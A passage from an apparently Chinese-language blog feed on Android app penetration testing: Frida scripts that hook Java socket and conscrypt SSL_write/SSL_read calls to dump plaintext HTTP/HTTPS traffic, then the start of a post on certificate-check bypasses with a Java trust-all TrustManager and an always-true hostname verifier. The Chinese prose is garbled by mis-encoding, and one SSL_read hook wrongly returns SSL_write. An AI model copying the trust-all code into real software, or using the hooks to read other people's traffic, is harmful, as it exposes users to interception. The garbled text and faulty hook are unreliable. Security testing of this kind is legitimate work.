bytes,off,len,timeout</span>)&#123;</span><br><span class="line">            <span class="title function_">hexdump</span>(bytes,off,len);</span><br><span class="line">            <span class="title function_">showStacks</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">SSL_write</span>(sslNativePointer,fd,shc, bytes,off,len,timeout);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;        </span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><h2 id="4-HTTPS-Response"><a href="#4-HTTPS-Response" class="headerlink" title="4. HTTPS Response"></a>4. HTTPS Response</h2><h4 id="Frida-Hook-Https-response"><a href="#Frida-Hook-Https-response" class="headerlink" title="Frida Hook Https-response"></a>Frida Hook Https-response</h4><p>åŒç†ï¼Œæ ¹æ®ä¸Šé¢çš„è°ƒç”¨é“¾ï¼Œå¯ä»¥å¾—åˆ°responseçš„æœ€ç»ˆè°ƒç”¨æ–¹æ³•ä¸ºï¼š<strong>NativeCrypto.SSL_read</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281047029.png" alt="image.png"> </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hexdump</span>(<span class="params">bytearry,offset,length</span>)&#123;</span><br><span class="line">    <span class="comment">// bytearray =&gt; [B</span></span><br><span class="line">    <span class="comment">// offset =&gt; I</span></span><br><span class="line">    <span class="comment">// length =&gt; I</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">HexDump</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.internal.util.HexDump&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">HexDump</span>.<span class="title function_">dumpHexString</span>(bytearry,offset,length))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‰“å°å®ƒçš„è°ƒç”¨æ ˆ</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.org.conscrypt.NativeCrypto&quot;</span>).<span class="property">SSL_read</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">sslNativePointer,fd,shc, bytes,off,len,timeout</span>)&#123;</span><br><span class="line">            <span class="title function_">hexdump</span>(bytes,off,len);</span><br><span class="line">            <span class="title function_">showStacks</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">SSL_write</span>.<span class="title function_">call</span>(sslNativePointer,fd,shc, bytes,off,len,timeout);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;        </span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281047167.png" alt="image.png"> </p><h4 id="æ‰“å°httpsçš„localå’Œremoteåœ°å€"><a href="#æ‰“å°httpsçš„localå’Œremoteåœ°å€" class="headerlink" title="æ‰“å°httpsçš„localå’Œremoteåœ°å€"></a>æ‰“å°httpsçš„localå’Œremoteåœ°å€</h4><p>æ ¹æ®ä¹‹å‰httpæ‰“å°åœ°å€çš„æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯è°ƒç”¨äº†<strong>this.socket</strong>çš„æ–¹æ³•æ¥æ‰“å°çš„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var localAddress = this.socket.value.getLocalAddress().toString()</span><br><span class="line">var remoteAddress = this.socket.value.getRemoteSocketAddress().toString()</span><br></pre></td></tr></table></figure><p>ä½†åœ¨ NativeCrypto ç±»ä¸­æ²¡æœ‰æ‰¾åˆ°socketæ–¹æ³•ã€‚</p><p>ç»§ç»­å‘å‰çœ‹ï¼Œå¯ä»¥çœ‹åˆ°åœ¨ â€œSSLOutputStream.writeâ€ æ–¹æ³•é‡Œé¢ï¼Œä½¿ç”¨ssl.writeçš„æ—¶å€™ï¼Œæ˜¯æœ‰socketçš„ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281048626.png" alt="image.png"> </p><p>åªä¸è¿‡ï¼Œè¿™å—å°† Platform.getFileDescriptor(socket) ä½œä¸ºäº†ssl.writeçš„ä¸€ä¸ªå‚æ•°ï¼Œè¿™å—<strong>Platform.getFileDescriptorå‡½æ•°</strong>ï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶çš„æè¿°ç¬¦ã€‚å¯ä»¥ç†è§£ä¸ºCè¯­è¨€ä¸­çš„openå‡½æ•°ï¼Œæ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿”å›äº†ä¸€ä¸ªæ–‡ä»¶æ“ä½œç¬¦ã€‚ã€‚ã€‚è¿™å—æƒ³è¦æ‹¿åˆ°å®ƒçš„å‚æ•° â€œsocketâ€ ï¼Œå°±æ˜¯æˆ‘ä»¬çš„ç›®çš„ã€‚</p><p>è¿™å—Fridaæä¾›äº†APIæ¥å£ï¼šâ€Socketâ€ï¼Œå®ƒé‡Œé¢æœ‰å®šä¹‰ä¸€äº›æ–¹æ³•ï¼Œå¯ä»¥è·å–åœ°å€ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281048364.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Socket.localAddress(handle)</span><br><span class="line">Socket.peerAddress(handle)</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Ÿè¿™å—çš„handleå‚æ•°åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿ</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281049952.png" alt="image.png"> </p><p>ç¡®å®šå‚æ•°ç±»å‹ï¼Œè¿™å—æ˜¯è¦è¾“å…¥ä¸€ä¸ªintæ•°å­—numberã€‚ã€‚ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function(sslNativePointer,fd,shc, bytes,off,len,timeout)</span><br></pre></td></tr></table></figure><p>functionä¸­ä¼ å…¥å‚æ•°æœ‰7ä¸ªï¼Œä½†å…¶ä¸­å…³äºå‚æ•° â€œfdâ€ çš„æè¿°æ˜¯ï¼š <strong>FileDescriptor fd</strong>ï¼ˆæ–‡ä»¶æè¿°ç¬¦ï¼‰</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281049281.png" alt="image.png"> </p><p>æŸ¥æ‰¾ FileDescriptor ç±»ï¼Œå‘ç°é‡Œé¢æ˜¯æœ‰ä¸€ä¸ª**getInt$()**çš„ç³»ç»Ÿæ–¹æ³•ï¼Œæ˜¯å¯ä»¥è·å–Descriptorçš„æ•°å€¼çš„ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281049665.png" alt="image.png"> </p><p>ç›´æ¥hookï¼Œæ‰“å°ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281049289.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281049925.png" alt="image.png"> </p><h2 id="5-æ•´åˆHTTP-HTTPSä»£ç å¦‚ä¸‹"><a href="#5-æ•´åˆHTTP-HTTPSä»£ç å¦‚ä¸‹" class="headerlink" title="5. æ•´åˆHTTP+HTTPSä»£ç å¦‚ä¸‹"></a>5. æ•´åˆHTTP+HTTPSä»£ç å¦‚ä¸‹</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Start hooking http/https request/response&quot;</span>);</span><br><span class="line">        <span class="comment">//Hook http request</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.net.SocketOutputStream&quot;</span>).<span class="property">socketWrite0</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">fd,bytes,off,len</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&lt;===Hook http request===&gt;&quot;</span>);</span><br><span class="line">            <span class="title function_">printHttpAddr</span>(<span class="variable language_">this</span>.<span class="property">socket</span>,<span class="literal">true</span>);</span><br><span class="line">            <span class="title function_">hexdump</span>(bytes,off,len);</span><br><span class="line">            <span class="title function_">showStacks</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">socketWrite0</span>(fd,bytes,off,len);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Hook http response</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.net.SocketInputStream&quot;</span>).<span class="property">socketRead0</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">fd,bytes,off,len,timeout</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&lt;===Hook http response===&gt;&quot;</span>);</span><br><span class="line">            <span class="title function_">printHttpAddr</span>(<span class="variable language_">this</span>.<span class="property">socket</span>,<span class="literal">false</span>);</span><br><span class="line">            <span class="title function_">hexdump</span>(bytes,off,len);</span><br><span class="line">            <span class="title function_">showStacks</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">socketRead0</span>(fd,bytes,off,len,timeout);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Hook https request</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.org.conscrypt.NativeCrypto&quot;</span>).<span class="property">SSL_write</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">sslNativePointer,fd,shc,bytes,off,len,timeout</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&lt;===Hook https request===&gt;&quot;</span>);</span><br><span class="line">            <span class="title function_">printHttpsAddr</span>(fd,<span class="literal">true</span>);</span><br><span class="line">            <span class="title function_">hexdump</span>(bytes,off,len);</span><br><span class="line">            <span class="title function_">showStacks</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">SSL_write</span>(sslNativePointer,fd,shc,bytes,off,len,timeout);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Hook https response</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.org.conscrypt.NativeCrypto&quot;</span>).<span class="property">SSL_read</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">sslNativePointer,fd,shc, bytes,off,len,timeout</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&lt;===Hook https response===&gt;&quot;</span>);</span><br><span class="line">            <span class="title function_">printHttpsAddr</span>(fd,<span class="literal">false</span>);</span><br><span class="line">            <span class="title function_">hexdump</span>(bytes,off,len);</span><br><span class="line">            <span class="title function_">showStacks</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">SSL_read</span>(sslNativePointer,fd,shc, bytes,off,len,timeout);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å°†å†…å­˜ä¸­çš„ byte è½¬æ¢ä¸º String</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">hexdump</span>(<span class="params">bytearry,offset,length</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">HexDump</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.internal.util.HexDump&quot;</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">HexDump</span>.<span class="title function_">dumpHexString</span>(bytearry,offset,length))</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ‰“å°å®ƒçš„è°ƒç”¨æ ˆ</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ‰“å°httpè¯·æ±‚çš„åœ°å€</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">printHttpAddr</span>(<span class="params">socket,isSend</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> localAddress = socket.<span class="property">value</span>.<span class="title function_">getLocalAddress</span>().<span class="title function_">toString</span>();</span><br><span class="line">            <span class="keyword">var</span> remoteAddress = socket.<span class="property">value</span>.<span class="title function_">getRemoteSocketAddress</span>().<span class="title function_">toString</span>();</span><br><span class="line">            <span class="keyword">if</span>(isSend) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Send http request to &quot;</span> + remoteAddress + <span class="string">&quot; from &quot;</span> + localAddress);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Recv http response from &quot;</span> + remoteAddress + <span class="string">&quot; to &quot;</span> + localAddress);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ‰“å°httpsè¯·æ±‚çš„åœ°å€</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">printHttpsAddr</span>(<span class="params">fd,isSend</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> localAddress = <span class="title class_">Socket</span>.<span class="title function_">localAddress</span>(fd.<span class="title function_">getInt$</span>());</span><br><span class="line">            <span class="keyword">var</span> remoteAddress = <span class="title class_">Socket</span>.<span class="title function_">peerAddress</span>(fd.<span class="title function_">getInt$</span>());</span><br><span class="line">            <span class="keyword">if</span>(isSend) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Send https request to &quot;</span> + remoteAddress.<span class="property">ip</span> + <span class="string">&quot;:&quot;</span> + remoteAddress.<span class="property">port</span> + <span class="string">&quot; from &quot;</span> + localAddress.<span class="property">ip</span> + <span class="string">&quot;:&quot;</span> + localAddress.<span class="property">port</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Recv https response from &quot;</span> + remoteAddress.<span class="property">ip</span> + <span class="string">&quot;:&quot;</span> + remoteAddress.<span class="property">port</span> + <span class="string">&quot; to &quot;</span> + localAddress.<span class="property">ip</span> + <span class="string">&quot;:&quot;</span> + localAddress.<span class="property">port</span>); </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> R0Capture </tag>
            
            <tag> APPæŠ“åŒ… </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android HTTPSé˜²æŠ“åŒ…ç­–ç•¥æ€»ç»“</title>
      <link href="/2024/06/20/HTTPS%E9%98%B2%E6%8A%93%E5%8C%85%E7%AD%96%E7%95%A5%E6%80%BB%E7%BB%93/"/>
      <url>/2024/06/20/HTTPS%E9%98%B2%E6%8A%93%E5%8C%85%E7%AD%96%E7%95%A5%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x01-å‰è¨€"><a href="#0x01-å‰è¨€" class="headerlink" title="0x01 å‰è¨€"></a>0x01 å‰è¨€</h1><p>åœ¨å¯¹ç§»åŠ¨Appå®‰å…¨æµ‹è¯•æ—¶ï¼Œé€šå¸¸ç¬¬ä¸€æ­¥æ˜¯å¯¹Appçš„ç½‘ç»œè¯·æ±‚æŠ¥æ–‡è¿›è¡ŒæŠ“åŒ…ã€‚å› ä¸ºAppå®¢æˆ·ç«¯å¯ä»¥å®ç°å¯¹HTTPSè¯ä¹¦è¿›è¡Œæ ¡éªŒä»¥é˜²æ­¢æŠ“åŒ…ï¼Œä¸ºäº†å¯¹æŠ—è¯ä¹¦æ ¡éªŒï¼Œä¸€èˆ¬ä¼šé‡‡ç”¨ä¿¡ä»»ä»£ç†å·¥å…·ç­¾å‘çš„è¯ä¹¦ã€å®‰è£…æ’ä»¶ç»•è¿‡è¯ä¹¦æ£€æµ‹ç­‰æ–¹æ³•ã€‚</p><p>æœ¬æ–‡å°†å¯¹å¸¸ç”¨çš„è¯ä¹¦æ ¡éªŒæ–¹å¼åŠç›¸åº”çš„å¯¹æŠ—æ–¹æ³•åšä¸ªç®€å•æ€»ç»“ã€‚</p><h1 id="0x02-äº†è§£HTTPSè¯ä¹¦"><a href="#0x02-äº†è§£HTTPSè¯ä¹¦" class="headerlink" title="0x02 äº†è§£HTTPSè¯ä¹¦"></a>0x02 äº†è§£HTTPSè¯ä¹¦</h1><p>åœ¨HTTPSæ¡æ‰‹å»ºç«‹é“¾æ¥æ—¶ï¼Œä¼šä½¿ç”¨éå¯¹ç§°ç®—æ³•åå•†é€šè®¯ä½¿ç”¨çš„åŠ å¯†å¯†é’¥ã€‚éå¯¹ç§°åŠ å¯†ç®—æ³•éœ€è¦ä¸¤ä¸ªå¯†é’¥ï¼šå…¬é’¥å’Œç§é’¥ã€‚</p><p>é€šå¸¸æ‰€è¯´çš„HTTPSè¯ä¹¦å°±å¯ä»¥ç†è§£ä¸ºå…¬é’¥ï¼Œä¸ºäº†ç¡®ä¿å®¢æˆ·ç«¯æ”¶åˆ°çš„è¯ä¹¦çš„çœŸå®æ€§ï¼Œäºæ˜¯è¯ç”Ÿäº†CAæœºæ„ï¼ŒCAæœºæ„é¢å‘çš„è¯ä¹¦ä¹Ÿå«CAè¯ä¹¦ï¼Œé˜²æ­¢CAè¯ä¹¦è¢«ä¼ªé€ ï¼ŒåŒæ—¶é¿å…å¥—å¨ƒï¼Œå› æ­¤åœ¨æ“ä½œç³»ç»Ÿä¸­å†…ç½®äº†ä¸€ä¸ªä¿¡ä»»åº“ï¼Œé‡Œé¢ä¿å­˜äº†å¯ä¿¡ä»»çš„CAè¯ä¹¦é›†åˆï¼Œä¹Ÿç§°ä¸ºç³»ç»Ÿæ ¹è¯ä¹¦ï¼Œç”¨äºæ ¡éªŒæœåŠ¡ç«¯è¿”å›çš„è¯ä¹¦çš„çœŸå®æ€§ã€‚åœ¨Androidç³»ç»Ÿä¸­ï¼Œå¯ä»¥ç‚¹å‡» è®¾ç½®-ç³»ç»Ÿå®‰å…¨-åŠ å¯†ä¸å‡­æ®-ä¿¡ä»»çš„å‡­æ®æŸ¥çœ‹é»˜è®¤ä¿¡ä»»çš„CAè¯ä¹¦ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406201108503.png" alt="image-20240620110802431"> </p><h1 id="0x03-è¯ä¹¦æ ¡éªŒ-å¯¹æŠ—"><a href="#0x03-è¯ä¹¦æ ¡éªŒ-å¯¹æŠ—" class="headerlink" title="0x03 è¯ä¹¦æ ¡éªŒ&amp;å¯¹æŠ—"></a>0x03 è¯ä¹¦æ ¡éªŒ&amp;å¯¹æŠ—</h1><p>åœ¨ä½¿ç”¨HTTPSåè®®è¿›è¡Œç½‘ç»œé€šè®¯æ—¶ï¼Œå¯¹HTTPSè¯ä¹¦æ ¡éªŒæœ‰å¤šç§å¤„ç†æ–¹å¼ï¼ŒåŒ…æ‹¬</p><ul><li>å¿½ç•¥è¯ä¹¦é“¾æ ¡éªŒ</li><li>ç³»ç»Ÿè¯ä¹¦é“¾æ ¡éªŒ</li><li>è¯ä¹¦ç»‘å®šï¼ˆSSL Pinningï¼Œä»£ç æ ¡éªŒå’Œé…ç½®æ–‡ä»¶ç»‘å®šï¼‰</li><li>åŒå‘æ ¡éªŒç­‰æ–¹å¼</li></ul><p>ä¸‹é¢ä»‹ç»ä¸‹APPå®ç°æ¯ç§æ ¡éªŒæ–¹æ³•ï¼Œä»¥åŠç›¸åº”çš„ç ´è§£æ–¹æ³•ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406201111264.png" alt="image-20240620111149218"> </p><h2 id="1-å¿½ç•¥è¯ä¹¦æ ¡éªŒ"><a href="#1-å¿½ç•¥è¯ä¹¦æ ¡éªŒ" class="headerlink" title="1. å¿½ç•¥è¯ä¹¦æ ¡éªŒ"></a>1. å¿½ç•¥è¯ä¹¦æ ¡éªŒ</h2><p>åœ¨å¯¹HTTPSè¯ä¹¦éªŒè¯æ—¶ï¼Œå¯ä»¥é€šè¿‡ä»£ç å®ç°ä¿¡ä»»æ‰€æœ‰è¯ä¹¦ï¼ˆè¿™ç§ä¹Ÿå°±æ˜¯ç›¸å½“äºæ²¡æœ‰ä»»ä½•çš„æ ¡éªŒï¼Œç›´æ¥æ­£å¸¸æŠ“åŒ…å³å¯ï¼‰ï¼Œä»¥OkHttpç½‘ç»œæ¡†æ¶ä¸ºä¾‹ï¼Œå‘èµ·ä¸€ä¸ªå¿½ç•¥HTTPSè¯ä¹¦æ ¡éªŒçš„è¯·æ±‚å®ç°å¦‚ä¸‹:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* httpsåè®®</span></span><br><span class="line"><span class="comment">* å¿½ç•¥è¯ä¹¦éªŒè¯</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mHttpsConnectTrustButton = findViewById(R.id.httpsConnectTrust);</span><br><span class="line">mHttpsConnectTrustButton.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>()&#123;</span><br><span class="line">            <span class="meta">@RequiresApi(api = Build.VERSION_CODES.KITKAT)</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="type">OkHttpClient</span> <span class="variable">mClient</span> <span class="operator">=</span> client.newBuilder().sslSocketFactory(HttpsTrustAllCerts.createSSLSocketFactory(),<span class="keyword">new</span> <span class="title class_">HttpsTrustAllCerts</span>()).hostnameVerifier(<span class="keyword">new</span> <span class="title class_">HttpsTrustAllCerts</span>.TrustAllHostnameVerifier()).build();</span><br><span class="line"></span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">                        .url(<span class="string">&quot;https://www.baidu.com/?q=trustAllCerts&quot;</span>)</span><br><span class="line">                        .build();</span><br><span class="line">                <span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Message</span>();</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> mClient.newCall(request).execute()) &#123;</span><br><span class="line">                    message.what = <span class="number">4432001</span>;</span><br><span class="line">                    message.obj = <span class="string">&quot;è¯·æ±‚æˆåŠŸ: &quot;</span> + response.code();</span><br><span class="line">                    mHandler.sendMessage(message);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    message.what = <span class="number">4434001</span>;</span><br><span class="line">                    message.obj = e.getLocalizedMessage();</span><br><span class="line">                    mHandler.sendMessage(message);</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>HttpsTrustAllCerts</code>å¯¹è±¡å®å¯¹<code>X509TrustManager</code>æ¥å£è¿›è¡Œäº†å®ç°ï¼Œé‡å†™<code>checkClientTrusted</code>ã€<code>checkServerTrusted</code>ã€<code>verify</code>ç­‰æ–¹æ³•ï¼Œä½¿å…¶éªŒè¯é€»è¾‘ä¸ºç©ºï¼Œè¾¾åˆ°ä¿¡ä»»æ‰€æœ‰è¯ä¹¦çš„æ•ˆæœ:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpsTrustAllCerts</span> <span class="keyword">implements</span> <span class="title class_">X509TrustManager</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkClientTrusted</span><span class="params">(X509Certificate[] chain, String authType)</span> &#123;</span><br><span class="line">        <span class="comment">//TODO</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkServerTrusted</span><span class="params">(X509Certificate[] chain, String authType)</span> &#123;</span><br><span class="line">        <span class="comment">//TODO</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> X509Certificate[] getAcceptedIssuers() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">X509Certificate</span>[<span class="number">0</span>]; <span class="comment">//è¿”å›é•¿åº¦ä¸º0çš„æ•°ç»„ï¼Œç›¸å½“äºreturn null</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SSLSocketFactory <span class="title function_">createSSLSocketFactory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">SSLSocketFactory</span> <span class="variable">sSLSocketFactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">SSLContext</span> <span class="variable">sc</span> <span class="operator">=</span> SSLContext.getInstance(<span class="string">&quot;TLS&quot;</span>);</span><br><span class="line">            sc.init(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">TrustManager</span>[]&#123;<span class="keyword">new</span> <span class="title class_">HttpsTrustAllCerts</span>()&#125;,<span class="keyword">new</span> <span class="title class_">SecureRandom</span>());</span><br><span class="line">            sSLSocketFactory = sc.getSocketFactory();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sSLSocketFactory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">TrustAllHostnameVerifier</span> <span class="keyword">implements</span> <span class="title class_">HostnameVerifier</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">verify</span><span class="params">(String s, SSLSession sslSession)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¿½ç•¥è¯ä¹¦æ ¡éªŒçš„httpsè¯·æ±‚å’Œä½¿ç”¨ httpåè®®çš„è¯·æ±‚æŠ¥æ–‡ä¸€æ ·ï¼Œå¯ä»¥ç›´æ¥è®¾ç½®ä»£ç†æŠ“åŒ…ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406201325324.png" alt="image.png"> </p><h2 id="2-ç³»ç»Ÿè¯ä¹¦æ ¡éªŒ"><a href="#2-ç³»ç»Ÿè¯ä¹¦æ ¡éªŒ" class="headerlink" title="2. ç³»ç»Ÿè¯ä¹¦æ ¡éªŒ"></a>2. ç³»ç»Ÿè¯ä¹¦æ 